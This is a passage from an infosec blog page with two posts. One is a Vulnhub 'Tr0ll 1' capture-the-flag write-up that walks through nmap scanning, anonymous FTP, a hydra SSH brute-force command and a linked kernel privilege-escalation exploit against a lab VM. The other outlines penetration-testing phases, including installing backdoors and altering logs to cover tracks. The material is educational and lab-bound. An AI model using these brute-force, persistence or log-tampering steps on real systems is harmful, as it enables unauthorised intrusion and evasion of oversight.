			<span class="posted-on">Posted on <a href="/vulnhub-tr0ll-1/" rel="bookmark"><time class="entry-date published" datetime="2017-08-25T17:46:40+08:00">August 25, 2017</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/vulnhub-tr0ll-1/#respond">Leave a Comment<span class="screen-reader-text"> on Vulnhub Tr0ll 1</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		<p>Started with the Nmap Scan</p>
<pre><code># Nmap 7.40 scan initiated Thu Aug  3 20:58:47 2017 as: nmap -sC -sV -oA nmap 192.168.8.102
Nmap scan report for 192.168.8.102
Host is up (0.0035s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
<span style="color: #ff0000;">21/tcp open  ftp     vsftpd 3.0.2</span>
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
<span style="color: #ff0000;">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span>
| http-robots.txt: 1 disallowed entry 
<span style="color: #ff0000;">|_/secret</span>
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug  3 20:59:07 2017 -- 1 IP address (1 host up) scanned in 19.95 seconds</code></pre>
<p class="comments-section">So there are 3 open ports in tr0ll vm</p>
<ul>
<li>port 21</li>
<li>port 22</li>
<li>port 80</li>
</ul>
<p class="comments-section">Since the port 80 is open, I have an idea now that the vulnerable machine has a web server running. So I opened my web browser and visit the IP address of the machine.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-340" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-07-14-59-21-e1503681890612.png?resize=734%2C585&#038;ssl=1" alt="screenshot-from-2017-08-07-14-59-21-e1503681730435.png" width="734" height="585" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-07-14-59-21-e1503681890612.png?w=734&amp;ssl=1 734w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-07-14-59-21-e1503681890612.png?resize=300%2C239&amp;ssl=1 300w" sizes="auto, (max-width: 734px) 100vw, 734px"></p>
<p class="comments-section">So this is the first thing that I saw.</p>
<p class="comments-section">I tried to see if it has a robots.txt in the root of the web server and it showed me this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-347" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-02-06-e1503681876965.png?resize=656%2C296&#038;ssl=1" alt="screenshot20from202017-08-072015-02-06.png" width="656" height="296" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-02-06-e1503681876965.png?w=656&amp;ssl=1 656w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-02-06-e1503681876965.png?resize=300%2C135&amp;ssl=1 300w" sizes="auto, (max-width: 656px) 100vw, 656px"></p>
<p>There is a directory in the web server named secret. So I opened the /secret directory and it showed me this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-356" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-03-20-e1503682119899.png?resize=745%2C650&#038;ssl=1" alt="screenshot20from202017-08-072015-03-20.png" width="745" height="650" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-03-20-e1503682119899.png?w=745&amp;ssl=1 745w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-03-20-e1503682119899.png?resize=300%2C262&amp;ssl=1 300w" sizes="auto, (max-width: 745px) 100vw, 745px"></p>
<p>And yes, it made me mad after seeing this.</p>
<p>Continuing my enumeration, I saw that the FTP server allows anonymous login, so I fired up my Filezilla and browse the FTP server. There is a file there named lol.pcap. Pcap is a file that contains the captured network traffics from network analyzers such as Wireshark and some other tools. So to open the pcap file, I launched Wireshark and read the pcap file. It showed me this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-359" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-032021-37-00-e1503710304210.png?resize=1170%2C610&#038;ssl=1" alt="screenshot20from202017-08-032021-37-00-e1503682196980.png" width="1170" height="610" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-032021-37-00-e1503710304210.png?w=1366&amp;ssl=1 1366w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-032021-37-00-e1503710304210.png?resize=300%2C156&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-032021-37-00-e1503710304210.png?resize=1024%2C534&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-032021-37-00-e1503710304210.png?resize=768%2C400&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<p>I noticed the &#8220;sup3rs3cr3tdirlol&#8221; and tried to open it and voila.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-361" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-13-36-e1503682263987.png?resize=548%2C388&#038;ssl=1" alt="screenshot20from202017-08-072015-13-36.png" width="548" height="388" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-13-36-e1503682263987.png?w=548&amp;ssl=1 548w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-13-36-e1503682263987.png?resize=300%2C212&amp;ssl=1 300w" sizes="auto, (max-width: 548px) 100vw, 548px"></p>
<p>I downloaded the file named roflmao then run the file command to determine the filetype of the downloaded file. It shows that it is an ELF 32-bit LSB executable.</p>
<pre><code>kaipowered@debian:~/Documents/Vulnhub/tr0ll$ file roflmao 
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped</code></pre>
<p>So the next thing I did was to run the gdb then run the executable file.</p>
<pre><code>GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from roflmao...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/kaipowered/Documents/Vulnhub/tr0ll/roflmao 
Find address 0x0856BF to proceed[Inferior 1 (process 10058) exited with code 040]
(gdb)</code></pre>
<p>The output showed me this</p>
<pre><code>Find address 0x0856BF to proceed[Inferior 1 (process 10058) exited with code 040]</code></pre>
<p>I tried to find the said address but I wasn&#8217;t able to find it in the memory, so I tried opening it on the web browser and it appears that it is a directory on the web server (luck I guess).</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-369" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-24-34-e1503682433212.png?resize=659%2C390&#038;ssl=1" alt="screenshot20from202017-08-072015-24-34" width="659" height="390" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-24-34-e1503682433212.png?w=659&amp;ssl=1 659w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot20from202017-08-072015-24-34-e1503682433212.png?resize=300%2C178&amp;ssl=1 300w" sizes="auto, (max-width: 659px) 100vw, 659px"></p>
<p class="comments-section">I downloaded the files from the directories and it appears that the contents of the files were usernames and passwords.</p>
<p class="comments-section">There was only one service that I haven&#8217;t checked, and that was the ssh.</p>
<p class="comments-section">The next thing I did was to brute force the ssh service with the given usernames and passwords.</p>
<pre><code>hydra -L which_one_lol.txt -P Pass.txt 192.168.8.102</code></pre>
<p>At first, the usernames and passwords combination did not work, so it was so frustrating.</p>
<pre><code>hydra -L which_one_lol.txt -p Pass.txt 192.168.8.102</code></pre>
<p>But it appears that the real password is the &#8220;Pass.txt&#8221;, so I just changed the option from -P to -p, meaning, with the given password, try the usernames from which_one_lol.txt to match the correct combinations with hydra.</p>
<p>After bruteforcing, I was able to get the username and password of the machine.</p>
<pre><code>username: overflow
password: Pass.txt</code></pre>
<p>Commands Used</p>
<pre><code>kaipowered@debian:~/Documents/Vulnhub/tr0ll$ ssh overflow@192.168.8.102
overflow@192.168.8.102's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Aug  6 23:35:25 2017 from 192.168.8.2
Could not chdir to home directory /home/overflow: No such file or directory
$</code></pre>
<p class="comments-section">The shell timeouts after a few minutes so the first thing that I did was to check the version of the kernel and it appears that the version of the kernel is GNU/Linux 3.13.0-32-generic i686</p>
<p class="comments-section">Next thing I did was to search the exploit-db for the available privilege escalation exploits of the kernel version.</p>
<p class="comments-section">This is the exploit that I used to gain root on the vulnerable machine:</p>
<p>https://www.exploit-db.com/exploits/37292/</p>
<p>And after successfully exploited the tr0ll vm, I was able to get and read the Proof.txt that can be found in /root directory.</p>
<p>&#8212; FIN &#8212;</p>
<p>Solving this challenge was quite frustrating at first because, you know, the tr0ll is trolling you, but most of the time, when I found something interesting and it just appeared that I have been tr0lled, I just found myself grinning while clenching my fists, but of course I enjoyed solving this challenge.</p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-9">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-9-label" for="subscribe-field-9" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-9" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-9">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="315">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/vulnhub/" rel="category tag">Vulnhub</a>, <a href="/category/writeups/" rel="category tag">Writeups</a></span> | <span class="tags-links">Tagged <a href="/tag/ctf/" rel="tag">ctf</a>, <a href="/tag/linux/" rel="tag">linux</a>, <a href="/tag/vulnhub/" rel="tag">vulnhub</a>, <a href="/tag/writeup/" rel="tag">writeup</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-51" class="post-51 post type-post status-publish format-standard has-post-thumbnail hentry category-pentesting tag-information-security tag-methodologies tag-phases no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="1920" height="1080" src="/wp-content/uploads/2017/08/superhacker_johnpetersen1.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/superhacker_johnpetersen1.jpg?w=1920&amp;ssl=1 1920w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/superhacker_johnpetersen1.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/superhacker_johnpetersen1.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/superhacker_johnpetersen1.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/superhacker_johnpetersen1.jpg?resize=1536%2C864&amp;ssl=1 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/phases-of-penetration-testing/" rel="bookmark">Phases of Penetration Testing</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/phases-of-penetration-testing/" rel="bookmark"><time class="entry-date published" datetime="2017-08-24T12:46:33+08:00">August 24, 2017</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/phases-of-penetration-testing/#respond">Leave a Comment<span class="screen-reader-text"> on Phases of Penetration Testing</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		<p>Penetration Testing or Pentesting is a process where the testers will assess and discover the vulnerabilities that are present in a network or system and will exploit these vulnerabilities to gain access. Pentesting is also the process of simulating real world scenario where the testers will act and think like an attacker to assess and discover weaknesses and exploit those weaknesses of the target system.</p>
<p>There are a lot of topics in penetration testing but I will only discuss the phases and techniques that I usually use when I am attacking a vulnerable system.</p>
<p>In general, the phases of penetration testing are</p>
<ol>
<li>Reconnaissance</li>
<li>Scanning</li>
<li>Gaining Access</li>
<li>Maintaining Access</li>
<li>Covering Tracks</li>
</ol>
<p>Before attacking our target system, we always need to plan our moves to get a higher chance of gaining access to the system.</p>
<h2><strong>Reconnaissance</strong></h2>
<p>So first is the Reconnaissance. Reconnaissance is the phase where we gather available information of the target with the use of search engines and/or social media sites. There are two types of reconnaissance, the passive reconnaissance, and active reconnaissance.</p>
<p><strong>Passive reconnaissance</strong> is the gathering of information on Google, company profile, social media, name servers, etc.</p>
<p><strong>Active reconnaissance</strong> is the gathering of information through scanning the target system with the use of tools that are available and can be downloaded online.</p>
<p>Beware of the IDS/IPS and Firewall when scanning because we are most likely will fail if the target system blocked our access.</p>
<p>Tools for&nbsp;<strong>active reconnaissance</strong></p>
<ul>
<li>nmap</li>
<li>maltego</li>
<li>etc.</li>
</ul>
<p>The goal of this phase is to gather the initial information of the target.</p>
<h2>Scanning</h2>
<p>After we gather the available information of the target, we will scan the target system to discover vulnerabilities that are present for us to exploit.</p>
<p>Tools for scanning</p>
<ul>
<li>nmap</li>
<li>auxiliary modules in metasploit</li>
<li>etc.</li>
</ul>
<p>Again, beware of the IDS/IPS and Firewall when scanning.</p>
<p>The goal of this phase is to have an idea on how we can exploit the vulnerabilities that are present on the target system. For example, if the target system is vulnerable to a certain exploit that is available in public, we can add this to our options in exploiting the target system.</p>
<h2>Gaining Access</h2>
<p>After enumerating our target, we will now move on to the fun part in hacking; the exploitation phase.</p>
<ul>
<li>Proper enumeration can lead to more chance of exploitation.</li>
<li>You can use public exploits to attack the vulnerable services that are present on the target&#8217;s local machine.</li>
<li>Public exploits may not work out of the box so you need to analyze how the exploit works by tracing the source code of the exploit.</li>
<li>Modify the source code of the exploit if you need to.</li>
<li>In compiling public exploits locally, make sure that it matches the kernel version of the local machine to the target machine.</li>
</ul>
<p>The goal of this phase is to properly exploit the vulnerabilities of the target and gain low-level or privileged access to the system.</p>
<h2>Maintaining Access</h2>
<p>When we successfully exploited and got a low privileged access to the system, we need to maintain our access long enough to achieve our goal.</p>
<ul>
<li>If you have gained access to the system, you may install a backdoor in the case of the user reboots the target machine</li>
<li>Since you only have an initial access to the system (low privileged access), enumerate for the available programs, weak credentials, default passwords, and others that may be used to escalate your privileges.</li>
<li>Check for the versions of the available services that are present on the target&#8217;s local machine</li>
<li>You can use automated scripts to automate the enumeration process</li>
<li>
<p class="comments-section">Look for the low hanging fruits, for example, there may be a hidden file, weak passwords, default config files and others that will be used to exploit and gain access to the target.</p>
</li>
<li>
<p class="comments-section"><strong>Some tools/scripts for enumerating the target:</strong></p>
<ul>
<li>
<strong>Linux Privilege Escalation Enumeration Scripts</strong>
<ul>
<li>unix-privesc-check &#8211;&nbsp;<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="noopener noreferrer">http://pentestmonkey.net/tools/audit/unix-privesc-check</a>
</li>
<li>linuxprivchecker.py &#8211;&nbsp;<a href="https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123" target="_blank" rel="noopener noreferrer">https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123</a>
</li>
<li>linenum &#8211;&nbsp;<a href="https://www.rebootuser.com/?p=1758" target="_blank" rel="noopener noreferrer">https://www.rebootuser.com/?p=1758</a>
</li>
<li>linux-local-enumeration-script.sh &#8211;&nbsp;<a href="https://highon.coffee/blog/linux-local-enumeration-script/" target="_blank" rel="noopener noreferrer">https://highon.coffee/blog/linux-local-enumeration-script/</a>
</li>
<li>Basic Linux Priv Escalation(blog post) &#8211;&nbsp;<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener noreferrer">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>The goal of this phase is to maintain and gain system level access to the system.</p>
<h2>Covering Tracks</h2>
<p>After we have gained access to the system and we already achieved our goal, we need to delete all the backdoors, exploits, and other files that we used to gain access to the system. We also need to delete or modify the system logs to cover our tracks.</p>
<p>The goal of this phase is self-explanatory.</p>
<h2>Conclusion</h2>
<p>So there are five phases of penetration testing and these are Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks. There are still a lot of information that wasn&#8217;t included here and I hope it gave you an idea and understand the phases and techniques on how the penetration testers attack a system.</p>
<p>If you have any questions or suggestions, feel free to contact me. ðŸ™‚</p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-10">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-10-label" for="subscribe-field-10" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-10" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-10">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="51">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/pentesting/" rel="category tag">Penetration Testing</a></span> | <span class="tags-links">Tagged <a href="/tag/information-security/" rel="tag">Information Security</a>, <a href="/tag/methodologies/" rel="tag">Methodologies</a>, <a href="/tag/phases/" rel="tag">phases</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

	<nav class="navigation posts-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Posts navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="/page/2/">Older posts</a></div></div>
	</nav>
		</div>
<!-- #main -->
	</section><!-- #primary -->


<aside id="secondary" class="widget-area col-sm-12 col-lg-4" role="complementary">
	<section id="search-7" class="widget widget_search"><form role="search" method="get" class="search-form" action="/">
    <label>
        <input type="search" class="search-field form-control" placeholder="Search &hellip;" value="" name="s" title="Search for:">
    </label>
    <input type="submit" class="search-submit btn btn-default" value="Search">
</form>



</section>
		<section id="recent-posts-10" class="widget widget_recent_entries">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="/attacking-and-defending-active-directory-part-i/">Attacking and Defending Active Directory Part I</a>
									</li>
											<li>
					<a href="/how-to-identify-phishing-emails/">How to identify phishing emails</a>
									</li>
											<li>
					<a href="/networking-concepts-and-protocols/">Networking Concepts and Protocols</a>
									</li>
											<li>
					<a href="/wec-and-wef-poor-mans-log-collection-on-windows/">Poor man&#8217;s log collection on Windows</a>
									</li>
											<li>
					<a href="/hack-the-box-optimum/">Hack the Box Optimum</a>
									</li>
					</ul>

		</section></aside><!-- #secondary -->
			</div>
<!-- .row -->
		</div>
<!-- .container -->
	</div>
<!-- #content -->
    	<footer id="colophon" class="site-footer navbar-light" role="contentinfo">
		<div class="container pt-3 pb-3">
            <div class="site-info">
                &copy; 2025 <a href="/">anotsodev</a>                <span class="sep"> | </span>
                <a class="credits" href="https://afterimagedesigns.com/wp-bootstrap-starter/" target="_blank" title="WordPress Technical Support" alt="Bootstrap WordPress Theme">Bootstrap WordPress Theme</a>

            </div>
<!-- close .site-info -->
		</div>
	</footer><!-- #colophon -->
</div>
<!-- #page -->

<script type="speculationrules">{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/wp-bootstrap-starter\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}</script>
<script type="importmap" id="wp-importmap">{"imports":{"@wordpress\/interactivity":"\/wp-includes\/js\/dist\/script-modules\/interactivity\/index.min.js?ver=55aebb6e0a16726baffb"}}</script>
<script type="63937a03c1b5e11e36329285-module" src="/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-forms/src/contact-form/../../dist/modules/form/view.js?ver=14.8" id="jp-forms-view-js-module"></script>
<link rel="modulepreload" href="/wp-includes/js/dist/script-modules/interactivity/index.min.js?ver=55aebb6e0a16726baffb" id="@wordpress/interactivity-js-modulepreload">
<script type="application/json" id="wp-script-module-data-@wordpress/interactivity">{"config":{"jetpack/form":{"error_types":{"is_required":"This field is required.","invalid_form_empty":"The form you are trying to submit is empty.","invalid_form":"Please fill out the form correctly."}}}}</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield 